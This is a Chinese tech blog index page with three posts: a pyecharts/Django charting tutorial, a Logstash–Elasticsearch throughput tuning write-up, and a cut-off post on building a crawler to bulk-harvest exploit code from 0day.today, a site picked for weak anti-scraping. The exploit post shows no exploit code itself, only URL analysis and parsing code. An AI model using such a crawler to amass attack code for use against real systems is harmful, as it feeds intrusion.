<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="诗和田野" type="application/atom+xml" />






<meta property="og:type" content="website">
<meta property="og:title" content="诗和田野">
<meta property="og:url" content="http://chucz.club/page/4/index.html">
<meta property="og:site_name" content="诗和田野">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="诗和田野">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://chucz.club/page/4/"/>





  <title>诗和田野</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">诗和田野</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">生活不苟且</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chucz.club/2018/04/09/Pyecharts-可视化初探/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chucz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="诗和田野">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/04/09/Pyecharts-可视化初探/" itemprop="url">Pyecharts 可视化初探</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-09T11:31:39+08:00">
                2018-04-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>纸短情长啊，诉不完当时年少，我的故事还是关于你呀</p>
</blockquote>
<p>　　最近在开发web应用过程中，需要用到可视化展示功能，因此找了找Python相关的可视化模块。这里简单记录下pyecharts模块的用法。推荐它主要是因为其功能强大，可视化功能选择比较多，且使用比较简单。<br><a id="more"></a></p>
<h3 id="pyecharts介绍"><a href="#pyecharts介绍" class="headerlink" title="pyecharts介绍"></a><a href="#pyecharts介绍" title="pyecharts介绍"></a>pyecharts介绍</h3><p>　　首先需要了解下pyecharts模块的运行机制，pyecharts是echarts的python-api，而echarts是百度开源的可视化框架。echarts是用来操作js文件的，因此pyecharts的出现其实是为了能够让python语言更好的对接echarts。简单来说，pyecharts会帮我们生成js文件。</p>
<h3 id="安装pyecharts"><a href="#安装pyecharts" class="headerlink" title="安装pyecharts"></a><a href="#安装pyecharts" title="安装pyecharts"></a>安装pyecharts</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install pyecharts</div></pre></td></tr></table></figure>

<p>或者Github下载源码安装：<a href="https://github.com/pyecharts/pyecharts" target="_blank" rel="noopener">https://github.com/pyecharts/pyecharts</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ git <span class="built_in">clone</span> <a href="https://github.com/pyecharts/pyecharts.git" target="_blank" rel="noopener">https://github.com/pyecharts/pyecharts.git</a></div><div class="line">$ <span class="built_in">cd</span> pyecharts</div><div class="line">$ pip install -r requirements.txt</div><div class="line">$ python setup.py install</div></pre></td></tr></table></figure>

<h3 id="简单使用pyecharts"><a href="#简单使用pyecharts" class="headerlink" title="简单使用pyecharts"></a><a href="#简单使用pyecharts" title="简单使用pyecharts"></a>简单使用pyecharts</h3><p>创建一个test.py文件，写入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pyecharts import Bar <span class="comment"># 柱状图</span></div><div class="line"></div><div class="line">attr = [<span class="string">“Jan”</span>, <span class="string">“Feb”</span>, <span class="string">“Mar”</span>, <span class="string">“Apr”</span>, <span class="string">“May”</span>, <span class="string">“Jun”</span>, <span class="string">“Jul”</span>, <span class="string">“Aug”</span>, <span class="string">“Sep”</span>, <span class="string">“Oct”</span>, <span class="string">“Nov”</span>, <span class="string">“Dec”</span>]</div><div class="line">v1 = [2.0, 4.9, 7.0, 23.2, 25.6, 76.7, 135.6, 162.2, 32.6, 20.0, 6.4, 3.3]</div><div class="line">v2 = [2.6, 5.9, 9.0, 26.4, 28.7, 70.7, 175.6, 182.2, 48.7, 18.8, 6.0, 2.3]</div><div class="line">bar = Bar(<span class="string">“Bar chart”</span>, <span class="string">“precipitation and evaporation one year”</span>)</div><div class="line">bar.add(<span class="string">“precipitation”</span>, attr, v1, mark_line=[<span class="string">“average”</span>], mark_point=[<span class="string">“max”</span>, <span class="string">“min”</span>])</div><div class="line">bar.add(<span class="string">“evaporation”</span>, attr, v2, mark_line=[<span class="string">“average”</span>], mark_point=[<span class="string">“max”</span>, <span class="string">“min”</span>])</div><div class="line">bar.render() <span class="comment"># 生成一个html文件</span></div></pre></td></tr></table></figure>

<p>运行test.py，会在当前目录下生成一个render.html文件，即包含柱状图的网页。查看此html文件，会发现其生成了很多js代码。</p>
<p>说明：除了柱状图外，pyecharts还支持其他可视化展示，具体可参考官方文档：<a href="http://pyecharts.org/#/zh-cn/charts" target="_blank" rel="noopener">http://pyecharts.org/#/zh-cn/charts</a></p>
<h3 id="pyecharts-Django"><a href="#pyecharts-Django" class="headerlink" title="pyecharts+Django"></a><a href="#pyecharts-Django" title="pyecharts+Django"></a>pyecharts+Django</h3><p>　　前面介绍的是利用pyecharts生成一个存在可视化图表的html页面，那么怎么在Django或者Flask等Web框架中使用呢？即如何在视图层生成图表代码，传递到模版层渲染展示？这里只介绍如何在Django中使用pyecharts，其他web框架同理，可自行研究。</p>
<h4 id="view视图层"><a href="#view视图层" class="headerlink" title="view视图层"></a><a href="#view视图层" title="view视图层"></a>view视图层</h4><p>在Django项目的view.py文件内写入:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">from django.http import HttpResponse</div><div class="line">from pyecharts import Pie</div><div class="line"></div><div class="line">REMOTE_HOST = <span class="string">“<a href="https://pyecharts.github.io/assets/js&quot;" target="_blank" rel="noopener">https://pyecharts.github.io/assets/js&quot;</a></span></div><div class="line"></div><div class="line">def Pie_():</div><div class="line">    <span class="comment"># 生成饼图</span></div><div class="line">    attr = [<span class="string">“衬衫”</span>, <span class="string">“羊毛衫”</span>, <span class="string">“雪纺衫”</span>, <span class="string">“裤子”</span>, <span class="string">“高跟鞋”</span>, <span class="string">“袜子”</span>]</div><div class="line">    v1 = [11, 12, 13, 10, 10, 10]</div><div class="line">    pie = Pie(<span class="string">“饼图示例”</span>)</div><div class="line">    pie.add(<span class="string">“”</span>, attr, v1, is_label_show=True)</div><div class="line">    </div><div class="line">    <span class="built_in">return</span> pie</div><div class="line"></div><div class="line">def index(request):</div><div class="line">    <span class="comment"># 可视化展示页面</span></div><div class="line">    pie = Pie_()</div><div class="line">    myechart=pie.render_embed() <span class="comment"># 饼图</span></div><div class="line">    host=REMOTE_HOST <span class="comment"># js文件源地址</span></div><div class="line">    script_list=pie.get_js_dependencies() <span class="comment"># 获取依赖的js文件名称（只获取当前视图需要的js）</span></div><div class="line"></div><div class="line">    <span class="built_in">return</span> render(request,<span class="string">“index.html”</span>,&#123;<span class="string">“myechart”</span>:myechart,<span class="string">“host”</span>:host,<span class="string">“script_list”</span>:script_list&#125;)</div></pre></td></tr></table></figure>

<p>说明：REMOTE_HOST可更换成本地地址，即先前往<a href="https://github.com/pyecharts/assets" target="_blank" rel="noopener">https://github.com/pyecharts/assets</a> clone项目，再将项目中的js目录copy到Django项目的static/js目录下，然后更改代码中的REMOTE_HOST为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">REMOTE_HOST = <span class="string">“<a href="https://pyecharts.github.io/assets/js&quot;" target="_blank" rel="noopener">https://pyecharts.github.io/assets/js&quot;</a></span></div><div class="line">改为：</div><div class="line">REMOTE_HOST = <span class="string">“../../static/js/js”</span></div></pre></td></tr></table></figure>

<h4 id="Django路由"><a href="#Django路由" class="headerlink" title="Django路由"></a><a href="#Django路由" title="Django路由"></a>Django路由</h4><p>在Django项目的urls.py文件内容写入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url(r<span class="string">‘^$’</span>,views.index, name=<span class="string">“index”</span>),</div></pre></td></tr></table></figure>

<h4 id="模版层"><a href="#模版层" class="headerlink" title="模版层"></a><a href="#模版层" title="模版层"></a>模版层</h4><p>在Django项目的templates目录下创建index.html文件，写入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset=<span class="string">“utf-8”</span>&gt;</div><div class="line">    &lt;title&gt;Proudly presented by PycCharts&lt;/title&gt;</div><div class="line">    &#123;% <span class="keyword">for</span> jsfile_name <span class="keyword">in</span> script_list %&#125;</div><div class="line">        &lt;script src=<span class="string">“&#123;&#123; host &#125;&#125;/&#123;&#123; jsfile_name &#125;&#125;.js”</span>&gt;&lt;/script&gt; <span class="comment"># 加载js文件</span></div><div class="line">    &#123;% endfor %&#125;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">  &#123;&#123; myechart|safe &#125;&#125; <span class="comment"># 显示可视化图表，注意要加safe，表示解析视图层传入的html内容</span></div><div class="line">&lt;/body&gt;</div><div class="line"></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>

<h4 id="运行django"><a href="#运行django" class="headerlink" title="运行django"></a><a href="#运行django" title="运行django"></a>运行django</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py runserver</div></pre></td></tr></table></figure>

<p>打开浏览器：<a href="http://127.0.0.1:8000" target="_blank" rel="noopener">http://127.0.0.1:8000</a></p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><a href="#参考资料" title="参考资料"></a>参考资料</h3><p>官方文档：<a href="http://pyecharts.org/#/zh-cn/" target="_blank" rel="noopener">http://pyecharts.org/#/zh-cn/</a><br>Github项目地址：<a href="https://github.com/pyecharts/pyecharts" target="_blank" rel="noopener">https://github.com/pyecharts/pyecharts</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chucz.club/2018/04/02/ELK的一次吞吐量优化/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chucz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="诗和田野">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/04/02/ELK的一次吞吐量优化/" itemprop="url">ELK的一次吞吐量优化</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-03T03:48:32+08:00">
                2018-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a><a href="#问题一" title="问题一"></a>问题一</h2><p>  ● 最近发现kibana的日志传的很慢，常常查不到日志，由于所有的日志收集都只传输到了一个logstash进行收集和过滤，于是怀疑是否是由于logstash的吞吐量存在瓶颈。一看，还真是到了瓶颈。</p>
<p>  ● 优化过程</p>
<p>  ● 经过查询logstash完整配置文件，有几个参数需要调整</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># pipeline线程数，官方建议是等于CPU内核数</span></span><br><span class="line"><span class="symbol">pipeline.workers:</span> <span class="number">24</span></span><br><span class="line"><span class="meta"># 实际output时的线程数</span></span><br><span class="line"><span class="symbol">pipeline.output.workers:</span> <span class="number">24</span></span><br><span class="line"><span class="meta"># 每次发送的事件数</span></span><br><span class="line"><span class="symbol">pipeline.batch.size:</span> <span class="number">3000</span></span><br><span class="line"><span class="meta"># 发送延时</span></span><br><span class="line"><span class="symbol">pipeline.batch.delay:</span> <span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>PS:由于我们的ES集群数据量较大（&gt;28T），所以具体配置数值视自身生产环境</p>
<h2 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a><a href="#问题二" title="问题二"></a>问题二</h2><p>  ● 在查看logstash日志过程中，我们看到了大量的以下报错</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">2017-03-18T09:46:21,043</span>][<span class="symbol">INFO </span>][<span class="string">logstash.outputs.elasticsearch</span>] retrying failed action with response code: 429 (&#123;”type”=&gt;”es<span class="emphasis"><em>rejected</em></span>execution_exception”, “reason”=&gt;”rejected execution of org.elasticsearch.transport.TransportService$6@6918cf2e on EsThreadPoolExecutor[bulk, queue capacity = 50, org.elasticsearch.common.util.concurrent.EsThreadPoolExecutor@55337655[Running, pool size = 24, active threads = 24, queued tasks = 50, completed tasks = 1767887463]]”&#125;)</span><br><span class="line">[<span class="string">2017-03-18T09:46:21,043</span>][<span class="symbol">ERROR</span>][<span class="string">logstash.outputs.elasticsearch</span>] Retrying individual actions</span><br></pre></td></tr></table></figure>

<p>  ● 查询官网，确认为时ES的写入遇到了瓶颈</p>
<p>  ● Make sure to watch for TOO_MANY_REQUESTS (429) response codes (EsRejectedExecutionException with the Java client), which is the way that Elasticsearch tells you that it cannot keep up with the current indexing rate. When it happens, you should pause indexing a bit before trying again, ideally with randomized exponential backoff.</p>
<p>我们首先想到的是来调整ES的线程数，但是官网写到”Don’t Touch There Settings!”, 那怎么办？于是乎官方建议我们修改logstash的参数pipeline.batch.size</p>
<p>  ● 在ES5.0以后，es将bulk、flush、get、index、search等线程池完全分离，自身的写入不会影响其他功能的性能。<br>来查询一下ES当前的线程情况：</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">GET _nodes/stats/thread_pool?pretty</span><br><span class="line"></span><br><span class="line">可以看到：</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">“_nodes”</span>: &#123;</span><br><span class="line">    <span class="string">“total”</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="string">“successful”</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="string">“failed”</span>: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">“cluster_name”</span>: <span class="string">“dev-elasticstack5.0”</span>,</span><br><span class="line">  <span class="string">“nodes”</span>: &#123;</span><br><span class="line">    <span class="string">“nnfCv8FrSh-p223gsbJVMA”</span>: &#123;</span><br><span class="line">      <span class="string">“timestamp”</span>: <span class="number">1489804973926</span>,</span><br><span class="line">      <span class="string">“name”</span>: <span class="string">“node-3”</span>,</span><br><span class="line">      <span class="string">“transport_address”</span>: <span class="string">“192.168.3.<strong><em>:9301”</em></strong></span>,</span><br><span class="line">      <span class="string">“host”</span>: <span class="string">“192.168.3.“</span>,</span><br><span class="line">      <span class="string">“ip”</span>: <span class="string">“192.168.3.***:9301”</span>,</span><br><span class="line">      <span class="string">“roles”</span>: [</span><br><span class="line">        <span class="string">“master”</span>,</span><br><span class="line">        <span class="string">“data”</span>,</span><br><span class="line">        <span class="string">“ingest”</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">“attributes”</span>: &#123;</span><br><span class="line">        <span class="string">“rack”</span>: <span class="string">“r1”</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">“thread_pool”</span>: &#123;</span><br><span class="line">        <span class="string">“bulk”</span>: &#123;</span><br><span class="line">          <span class="string">“threads”</span>: <span class="number">24</span>,</span><br><span class="line">          <span class="string">“queue”</span>: <span class="number">214</span>,</span><br><span class="line">          <span class="string">“active”</span>: <span class="number">24</span>,</span><br><span class="line">          <span class="string">“rejected”</span>: <span class="number">30804543</span>,</span><br><span class="line">          <span class="string">“largest”</span>: <span class="number">24</span>,</span><br><span class="line">          <span class="string">“completed”</span>: <span class="number">1047606679</span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        ……</span><br><span class="line"></span><br><span class="line">        <span class="string">“watcher”</span>: &#123;</span><br><span class="line">  <span class="string">“threads”</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="string">“queue”</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="string">“active”</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="string">“rejected”</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="string">“largest”</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="string">“completed”</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中：”bulk”模板的线程数24，当前活跃的线程数24，证明所有的线程是busy的状态，queue队列214，rejected为30804543。那么问题就找到了，所有的线程都在忙，队列堵满后再有进程写入就会被拒绝，而当前拒绝数为30804543。<br>优化方案<br>问题找到了，如何优化呢。官方的建议是提高每次批处理的数量，调节传输间歇时间。当batch.size增大，es处理的事件数就会变少，写入也就愉快了。</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/logstash/logstash.yml</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="symbol">pipeline.workers:</span> <span class="number">24</span></span><br><span class="line"><span class="symbol">pipeline.output.workers:</span> <span class="number">24</span></span><br><span class="line"><span class="symbol">pipeline.batch.size:</span> <span class="number">10000</span></span><br><span class="line"><span class="symbol">pipeline.batch.delay:</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>具体的worker/output.workers数量建议等于CPU数，batch.size/batch.delay根据实际的数据量逐渐增大来测试最优值。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chucz.club/2018/03/26/记一次爬虫批量爬取exp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chucz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="诗和田野">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/26/记一次爬虫批量爬取exp/" itemprop="url">记一次爬虫批量爬取exp</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-27T03:20:08+08:00">
                2018-03-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>磨刀不误砍柴工</p>
</blockquote>
<p>　　最近需要收集一些exp，因此逛了逛<a href="https://www.exploit-db.com/" target="_blank" rel="noopener">exploit-db</a>、<a href="http://expku.com/" target="_blank" rel="noopener">国内exp搜索大全</a>、<a href="https://www.seebug.org/" target="_blank" rel="noopener">seebug</a>等几个exp收集的网站。由于需要批量获取漏洞信息以及对应的exp内容，因此心想有必要写一款爬虫去自动化收集漏洞exp。<br><a id="more"></a></p>
<h3 id="选个target"><a href="#选个target" class="headerlink" title="选个target"></a><a href="#选个target" title="选个target"></a>选个target</h3><p>　　前面三个网站都有丰富的exp资源，但是我并不打算从它们身上去爬取，这里介绍另外一个更牛逼的网站：<a href="https://cn.0day.today/" target="_blank" rel="noopener">0day.today</a>（需要翻墙）。选取它的原因是exp更新的更快更丰富，且反爬虫策略做的比较一般。</p>
<h3 id="分析URL结构"><a href="#分析URL结构" class="headerlink" title="分析URL结构"></a><a href="#分析URL结构" title="分析URL结构"></a>分析URL结构</h3><p>选好目标后，先尝试分析下网页结构，比如需要判断是动态还是静态页面等特征。此网站算是动态的，其漏洞列表URL结构如下：</p>
<ul>
<li>cn.0day.today/webapps/1（web漏洞列表第一页）</li>
<li>cn.0day.today/webapps/2（web漏洞列表第二页）</li>
<li>cn.0day.today/remote/1（远程利用漏洞列表第一页）</li>
<li>cn.0day.today/local/1（本地利用漏洞列表第一页）</li>
<li>……</li>
</ul>
<p>每个漏洞列表页面内有30个漏洞列表，每个漏洞列表对应一个漏洞URL，结构如下：</p>
<ul>
<li>cn.0day.today/exploit/30029</li>
<li>cn.0day.today/exploit/30030</li>
</ul>
<p>说明：此URL内容便是某个漏洞的exp，粗略算一下，web漏洞有600页，每页30个，总数是18000个漏洞exp。</p>
<h3 id="分析网页内容"><a href="#分析网页内容" class="headerlink" title="分析网页内容"></a><a href="#分析网页内容" title="分析网页内容"></a>分析网页内容</h3><p>　　分析完URL结构，大致可以得出爬虫思路：遍历漏洞列表页数获取全部漏洞URL–&gt;爬取漏洞URL获取漏洞exp。<br>　　那么如何通过爬取漏洞列表页面获取漏洞对应的URL，以及如何爬取漏洞信息页面获取exp？，这里需要分析一下页面结构，可以尝试写正则或者摘取网页元素内容的方式获取目标内容。</p>
<h4 id="获取漏洞URL"><a href="#获取漏洞URL" class="headerlink" title="获取漏洞URL"></a><a href="#获取漏洞URL" title="获取漏洞URL"></a>获取漏洞URL</h4><p>页面结构：<br><img src="/upload_image/20180327/3.png" alt=""><br>对于此页面我没有使用正则，而是使用了BeautifulSoup模块来获取网页元素内容，代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">soup=BeautifulSoup(content,<span class="string">“html.parser”</span>)</div><div class="line">n=soup.find_all(<span class="string">“div”</span>,&#123;<span class="string">“class”</span>:<span class="string">“ExploitTableContent”</span>&#125;)</div><div class="line"><span class="keyword">if</span> n:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> n:</div><div class="line">        m=i.find_all(<span class="string">“div”</span>,&#123;<span class="string">“class”</span>:<span class="string">“td allow_tip “</span>&#125;)</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> m:</div><div class="line">            y=j.find_all(<span class="string">“a”</span>)</div><div class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> y:</div><div class="line">                vul_name=x.text <span class="comment"># 漏洞名称</span></div><div class="line">                vul_url=x.attrs.get(<span class="string">“href”</span>) <span class="comment"># 漏洞url</span></div></pre></td></tr></table></figure>

